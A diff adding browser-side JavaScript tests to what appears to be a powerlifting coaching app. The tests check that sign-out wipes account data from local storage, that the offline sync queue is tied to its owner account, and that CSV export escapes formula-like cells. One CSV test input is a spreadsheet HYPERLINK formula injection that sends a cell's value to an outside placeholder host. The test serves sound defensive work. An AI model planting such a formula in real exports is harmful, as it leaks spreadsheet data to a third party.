@@ -7091,6 +7091,123 @@ test('report: an approved busy week counts its agreed sessions (the table keeps 
   eq(CoachReport.busyRows(rows).map(r => r.days).join(), '2,3', 'reading its own rows again keeps the numbers');
 });
 
+/* ===========================================================
+   Sign-out wipe, the offline queue's owner, CSV cells (security sweep 2026-10-28 #4, #6, #7).
+   These touch this browser's own storage (admin.html runs this page on the live site): every
+   powa-* and sb-* key is put back exactly as it was, and nothing here sends anything.
+   =========================================================== */
+group('sign-out wipe, offline queue owner, CSV cells (security)');
+(() => {
+  const lsKeys = () => { const a = []; for (let i = 0; i < localStorage.length; i++) a.push(localStorage.key(i)); return a; };
+  const keep = {};
+  lsKeys().forEach(k => { if (/^(powa-|sb-)/.test(k)) keep[k] = localStorage.getItem(k); });
+  const realUser = window._user, realDB = typeof DB === 'undefined' ? undefined : DB, realOut = window._signingOut;
+  const put = (k, v) => localStorage.setItem(k, typeof v === 'string' ? v : JSON.stringify(v));
+  const clearQueues = () => [_PENDING_LOGS_KEY, _PENDING_ATTEMPTS_KEY, _OUTBOX_KEY, _OUTBOX_ATTEMPTS_KEY, _QUEUE_OWNER_KEY].forEach(k => localStorage.removeItem(k));
+  const queueOne = () => { clearQueues(); put(_PENDING_LOGS_KEY, [{ id: 'sec-l1', athleteId: 'sec-a', lift: 'squat', weight: 100, reps: 5, rpe: 8, date: '2026-10-28' }]); put(_OUTBOX_KEY, [{ key: 'bw:sec-a:2026-10-28', kind: 'bw', payload: { athleteId: 'sec-a', date: '2026-10-28', weight: 80 }, ts: 1 }]); };
+  try {
+    test('a log-out, deletion or refused session in progress writes no snapshot back (#4)', () => {
+      localStorage.removeItem('powa-snapshot-sec-a');
+      window._signingOut = true;
+      _saveSnapshot({ id: 'sec-a', name: 'A' }, { athletes: [] });
+      eq(localStorage.getItem('powa-snapshot-sec-a'), null, 'written while signing out');
+      window._signingOut = false;
+      _saveSnapshot({ id: 'sec-a', name: 'A' }, { athletes: [] });
+      assert(!!localStorage.getItem('powa-snapshot-sec-a'), 'an ordinary save still works');
+      localStorage.removeItem('powa-snapshot-sec-a');
+    });
+    test('a sign-out sweeps every account key (snapshots, names, notes, health, intake, billing, boards); device settings stay (#6)', () => {
+      const gone = ['powa-snapshot-sec-a', 'powa-snapshot-sec-b', 'powa-intake-draft-sec-a', 'powa-intake-sec-a', 'powa-health-sleep-sec-a', 'powa-opl-sec-a', 'powa-cut-sec-a',
+        'powa-ds-names', 'powa-saved-replies-sec-c', 'powa-weekly-notes-sec-c', 'powa-week-changes-sec-c', 'powa-coach-notes-sec-c', 'powa-client-billing-sec-c', 'powa-teams-sec-c',
+        'powa-fca-sec-f', 'powa-ready-2026-10-28', 'powa-md-local-sec', 'powa-challenges-sec-c', 'powa-busy-week-sec-a', 'powa-attempt-plans', 'powa-club-board', 'powa-club-stats', 'powa-club-name'];
+      const stay = { 'powa-theme': 'dark', 'powa-unit': 'kg', 'powa-desk-theme': 'light', 'powa-card-format': 'story', 'powa-consent': 'all', 'powa-desk-rail': '1', 'powa-push-off': '1' };
+      Object.keys(stay).forEach(k => put(k, stay[k]));
+      gone.forEach(k => put(k, '{"secret":"Priya, knee 7/10"}'));
+      assert(_sweepAccountKeys() >= gone.length, 'counted');
+      gone.forEach(k => eq(localStorage.getItem(k), null, k + ' left behind'));
+      Object.keys(stay).forEach(k => eq(localStorage.getItem(k), stay[k], k + ' (a setting) removed'));
+    });
+    test('the one snapshot on the device names the queue\'s owner; two say nothing', () => {
+      lsKeys().filter(k => /^powa-snapshot-/.test(k)).forEach(k => localStorage.removeItem(k));
+      put('powa-snapshot-sec-a', '{}');
+      eq(_lastSnapshotUid(), 'sec-a');
+      put('powa-snapshot-sec-b', '{}');
+      eq(_lastSnapshotUid(), null);
+      localStorage.removeItem('powa-snapshot-sec-a'); localStorage.removeItem('powa-snapshot-sec-b');
+    });
+    test('a chosen log-out takes the queues; a sign-out the person didn\'t choose keeps them, tagged with the account (#6)', () => {
+      window._user = { id: 'sec-a' };
+      queueOne();
+      _wipeLocalUserData({ uid: 'sec-a', keepQueue: true });
+      eq(_readPendingLogs().length, 1, 'sets kept'); eq(_readOutbox().length, 1, 'changes kept');
+      eq(_queueOwner(), 'sec-a', 'tagged');
+      _wipeLocalUserData({ uid: 'sec-a' });
+      eq(_readPendingLogs().length, 0, 'sets dropped'); eq(_readOutbox().length, 0, 'changes dropped'); eq(_queueOwner(), null, 'tag dropped');
+    });
+    test('the queue counts and sends only for its own account, never while nobody is signed in (#6)', () => {
+      queueOne(); put(_QUEUE_OWNER_KEY, 'sec-a');
+      let sent = 0;
+      window.DB = { addLog: () => { sent++; return Promise.resolve(); }, upsertBw: () => { sent++; return Promise.resolve(); } };
+      window._user = null;
+      eq(_queueIsMine(), false); eq(_pendingCount(), 0); eq(powaSyncState().sets, 0);
+      flushPendingLogs(); flushOutbox();
+      window._user = { id: 'sec-b' };
+      eq(_queueIsMine(), false, 'another account'); eq(_pendingCount(), 0); eq(powaSyncState().changes, 0);
+      flushPendingLogs(); flushOutbox();
+      eq(sent, 0, 'sent as someone else');
+      window._user = { id: 'sec-a' };
+      eq(_queueIsMine(), true); eq(_pendingCount(), 2);
+      const st = powaSyncState(); eq(st.sets, 1); eq(st.changes, 1);
+      localStorage.removeItem(_QUEUE_OWNER_KEY);
+      window._user = { id: 'sec-b' };
+      eq(_queueIsMine(), true, 'a queue from before the tag goes to whoever signs in next, as before');
+      clearQueues();
+    });
+    test('another account signing in drops the old queue; the same account keeps it; queueing claims it', () => {
+      queueOne(); put(_QUEUE_OWNER_KEY, 'sec-a');
+      _reconcileQueueOwner('sec-a');
+      eq(_readPendingLogs().length, 1, 'same account: kept');
+      _reconcileQueueOwner('sec-b');
+      eq(_readPendingLogs().length, 0, 'other account: dropped'); eq(_readOutbox().length, 0); eq(_queueOwner(), null);
+      clearQueues();
+      window._user = { id: 'sec-b' };
+      _queuePendingLog({ id: 'sec-l2', athleteId: 'sec-b' });
+      eq(_queueOwner(), 'sec-b', 'claimed when queued');
+      _tagQueueOwner('sec-z');
+      eq(_queueOwner(), 'sec-b', 'a tag is never moved');
+      clearQueues();
+      _tagQueueOwner('sec-z');
+      eq(_queueOwner(), null, 'nothing queued: no tag');
+    });
+    test('words for what still waits', () => {
+      eq(_unsyncedWords({ sets: 1, changes: 0 }), '1 set');
+      eq(_unsyncedWords({ sets: 3, changes: 2 }), '3 sets and 2 changes');
+      eq(_unsyncedWords({ sets: 0, changes: 1 }), '1 change');
+    });
+    test('a deleted account (no profile row) counts as refused; a network blip never does', () => {
+      eq(_isAuthError(new Error('Profile not found for 1234')), true);
+      eq(_isAuthError({ status: 401 }), true);
+      eq(_isAuthError(new TypeError('Failed to fetch')), false);
+      eq(_isAuthError(Object.assign(new Error('timeout'), { transient: true })), false);
+    });
+    test('CSV cells: a name that starts like a formula stays text, numbers stay numbers (#7)', () => {
+      eq(_csvEscape('=1+1'), "'=1+1");
+      eq(_csvEscape('=HYPERLINK("https://example.invalid/?d="&B3,"Arjun")'), '"\'=HYPERLINK(""https://example.invalid/?d=""&B3,""Arjun"")"');
+      eq(_csvEscape('@SUM(1,1)'), '"\'@SUM(1,1)"');
+      eq(_csvEscape('-2+3'), "'-2+3");
+      eq(_csvEscape('+1 call me'), "'+1 call me");
+      eq(_csvEscape('\t=1'), "'\t=1");
+      eq(_csvEscape('220.00'), '220.00');
+      eq(_csvEscape('-5.00'), '-5.00');
+      eq(_csvEscape('Arjun Mehta'), 'Arjun Mehta');
+    });
+  } finally {
+    window._user = realUser; window.DB = realDB; window._signingOut = realOut;
+    lsKeys().filter(k => /^(powa-|sb-)/.test(k) && !(k in keep)).forEach(k => localStorage.removeItem(k));
+    Object.keys(keep).forEach(k => localStorage.setItem(k, keep[k]));
+  }
+})();
+
 function render() {
   const sum = document.getElementById('summary');
   const total = T.pass + T.fail + T.skip;
